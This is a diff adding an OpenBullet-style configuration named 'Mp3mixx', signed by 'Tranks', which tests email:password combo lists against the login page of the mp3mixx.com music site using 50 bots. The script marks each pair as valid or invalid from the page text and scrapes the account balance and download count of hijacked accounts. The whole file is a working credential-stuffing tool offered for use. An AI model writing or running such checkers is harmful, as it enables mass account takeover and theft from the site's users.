@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Mp3mixx",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-15T22:56:16.0009681+02:00",
+  "AdditionalInfo": "",
+  "Author": "Tranks",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "http://www.mp3mixx.com/users/login" 
+  CONTENT "login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.mp3mixx.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: http://www.mp3mixx.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "DNT: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Referer: http://www.mp3mixx.com/users/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7" 
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<div>Incorrect login or/and password</div>" 
+  KEYCHAIN Success OR 
+    KEY "<dt>Your balance:</dt>" 
+#TRE PARSE "<SOURCE>" LR "<dd><span class=\"balance\">" "</span>" -> CAP "Your balance:" 
+#NKS PARSE "<SOURCE>" LR "<dd><b>" "</b></dd>" -> CAP "Total downloads:" "" " |By:Tranks" 
